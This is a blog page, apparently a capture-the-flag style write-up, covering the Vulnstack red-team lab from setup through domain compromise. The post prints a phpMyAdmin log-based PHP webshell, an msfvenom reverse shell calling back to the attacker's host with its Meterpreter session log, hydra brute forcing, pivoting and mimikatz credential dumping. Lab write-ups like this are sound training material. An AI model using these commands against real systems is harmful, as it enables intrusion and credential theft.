@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ShangZeng">
+
+
+
+
+
+<title>ATTCK红队评估【一】 | ShangZeng</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">ShangZeng&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/friends">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">ShangZeng&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/friends">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">ATTCK红队评估【一】</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">ShangZeng</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 30, 2020&nbsp;&nbsp;10:48:54</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/other/">other</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="ATT-amp-CK红队评估-【一】"><a href="#ATT-amp-CK红队评估-【一】" class="headerlink" title="ATT&amp;CK红队评估 【一】"></a>ATT&amp;CK红队评估 【一】</h2><p>红日安全团队的一套靶场，用于学习和练习</p>
+<h2 id="下载-amp-amp-配置"><a href="#下载-amp-amp-配置" class="headerlink" title="下载&amp;&amp;配置"></a>下载&amp;&amp;配置</h2><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<p>MAC配置如下：</p>
+<p>macos修改vmware Fusion的NAT网络</p>
+<p>点击vmware Fusion &gt; 偏好设置 </p>
+<p><img src="/.club//image.png" alt="image"></p>
+<p>网络 &gt; 解锁 &gt; “+” &gt; 添加子网IP“162.168.52.0” &gt; 取消勾选混杂模式</p>
+<p><img src="/.club//image-1.png" alt="image"></p>
+<p>在Windows 7 x64 设置 &gt; 添加设备 &gt; 网络适配器</p>
+<p>网络适配器一选择桥接模式（自动检测），网络适配器二选择之前设置的wmnet</p>
+<p><img src="/.club//image-2.png" alt="image"></p>
+<p>进入Windows 7 x64选择 &gt; 网络和internet &gt; 网络共享中心 &gt; 更改适配器设置 &gt; 自动获取IP地址</p>
+<p><img src="/.club//image-3.png" alt="image"></p>
+<p>剩下两台服务器的网络适配器选择之前设置的wmnet，启动Windows 7 x64的PHPstudy，检查下网络是否能ping通。</p>
+<p><img src="/.club//image-4.png" alt="image"></p>
+<h2 id="入口权限获取"><a href="#入口权限获取" class="headerlink" title="入口权限获取"></a>入口权限获取</h2><p>使用nmap对“外网”IP进行探测:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 192.168.1.30 -Pn -T5 -O -sS</span><br></pre></td></tr></table></figure>
+<p><img src="/.club//image-5.png" alt="image"></p>
+<p>发现开放3306，80端口，80端口是PHPstudy探针，尝试hydra爆破3306端口的数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L &#x2F;root&#x2F;桌面&#x2F;user.txt -P &#x2F;root&#x2F;桌面&#x2F;ssh-pass.txt -t 5 -e ns -f -s 3306 192.168.1.30 mysql</span><br></pre></td></tr></table></figure>
+<p>3306只允许本地连接，访问80端口是探针，路径扫描，发现phpmyadmin。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host 192.168.1.30</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.club//image-6.png" alt="image"></p>
+<p>爆破：</p>
+<p><img src="/.club//image-7.png" alt="image"></p>
+<p>禁止写入，无法使用 into outfile:</p>
+<p><img src="/.club//image-8.png" alt="image"></p>
+<p>在phpmyadmin的sql语句中执行开启全局日志，并写入getshell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;;   #查询日志是否开启</span><br><span class="line"></span><br><span class="line">set global general_log&#x3D; ON        # 修改参数</span><br><span class="line"></span><br><span class="line">set global general_log_file &#x3D; &#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;360.php&#39; #修改日志存储位置</span><br><span class="line"></span><br><span class="line">select &#39;&lt;?php eval($_POST[&#39;360&#39;]; ?)&gt;&#39;  #在日志写入shell</span><br></pre></td></tr></table></figure>
+<p>连接，这里要注意格式，多次写入会报错：</p>
+<p><img src="/.club//image-9.png" alt="image"></p>
+<h2 id="代理-amp-amp-转发"><a href="#代理-amp-amp-转发" class="headerlink" title="代理&amp;&amp;转发"></a>代理&amp;&amp;转发</h2><p>创建反弹shell的PHP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.28 lport&#x3D;6666 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
+<p>创建监听端口,等待反弹：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.1.28 </span><br><span class="line">LHOST &#x3D;&gt; 192.168.1.28</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 6666</span><br><span class="line">LPORT &#x3D;&gt; 6666</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.28:6666 </span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.1.30</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.28:6666 -&gt; 192.168.1.30:20484) at 2020-03-18 08:21:07 +0800</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/.club//image-10.png" alt="image"></p>
+<h3 id="内网基本信息收集"><a href="#内网基本信息收集" class="headerlink" title="内网基本信息收集"></a>内网基本信息收集</h3><p>获取域控机器IP ： <strong>192.168.52.138</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user &#x2F;domain    #查询域用户</span><br><span class="line">net group &#x2F;domain   #查看在域中有哪些组</span><br><span class="line">net time &#x2F;domain  #显示时间，如果存在域会从域控返回时间</span><br><span class="line">net config workstation #工作域显示域名</span><br><span class="line">ping owa.god.org   # 获取域控IP</span><br></pre></td></tr></table></figure>
+<p>被控制win7中存在nmap,扫描C段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.52.0-255</span><br></pre></td></tr></table></figure>
+<p>扫描存活主机端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 192.168.52.138,141</span><br></pre></td></tr></table></figure>
+
+<h3 id="添加路由-代理"><a href="#添加路由-代理" class="headerlink" title="添加路由/代理"></a>添加路由/代理</h3><p>获取内网地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">Local subnet: 169.254.0.0&#x2F;255.255.0.0</span><br><span class="line">Local subnet: 192.168.0.0&#x2F;255.255.255.0</span><br><span class="line">Local subnet: 192.168.52.0&#x2F;255.255.255.0</span><br></pre></td></tr></table></figure>
+
+<p>添加目标网段的路由</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0&#x2F;255.255.255.0</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">[*] Adding a route to 192.168.52.0&#x2F;...</span><br><span class="line">[+] Added route to 192.168.52.0&#x2F; via 192.168.0.17</span><br><span class="line">[*] Use the -p option to list all active routes</span><br></pre></td></tr></table></figure>
+<p>添加路由成功后，我们查看路由的添加情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.52.0       255.255.255.0      Session 1</span><br></pre></td></tr></table></figure>
+<h3 id="获取域控权限"><a href="#获取域控权限" class="headerlink" title="获取域控权限"></a>获取域控权限</h3><p>探测域控主机是否存在17-010漏洞：</p>
+<p><img src="/.club//image-11.png" alt="image"></p>
+<p>利用，获取权限：</p>
+<p>使用mimikatz读取域控帐号密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
+
+
+<p>看了官方WP发现还有很多漏洞，感兴趣的师傅可以自己搞一下～</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.freebuf.com/column/230476.html" target="_blank" rel="noopener">ATT&amp;CK实战 | 红队评估一(上)</a></p>
+<p><a href="https://www.freebuf.com/column/230725.html" target="_blank" rel="noopener">ATT&amp;CK实战 | 红队评估一(下)</a></p>
+<p><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">后渗透之meterpreter使用攻略</a></p>
+<p><a href="https://www.bilibili.com/video/av88459896?p=3" target="_blank" rel="noopener">2020最新-内网渗透视频</a></p>
+<h2 id="后续学习-amp-amp-补全"><a href="#后续学习-amp-amp-补全" class="headerlink" title="后续学习&amp;&amp;补全"></a>后续学习&amp;&amp;补全</h2><ol>
+<li>msfvenom 学习（免杀学习）</li>
+<li>mimikatz 学习(免杀，无文件)</li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>ShangZeng</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://www.shangzeng.club/2020/07/30/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E3%80%90%E4%B8%80%E3%80%91/">https://www.shangzeng.club/2020/07/30/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E3%80%90%E4%B8%80%E3%80%91/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/other/"># other</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/">从零开始学习webshell-jsp</a>
+            
+            
+            <a class="next" rel="next" href="/2020/07/30/ATT/">ATT</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© ShangZeng | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
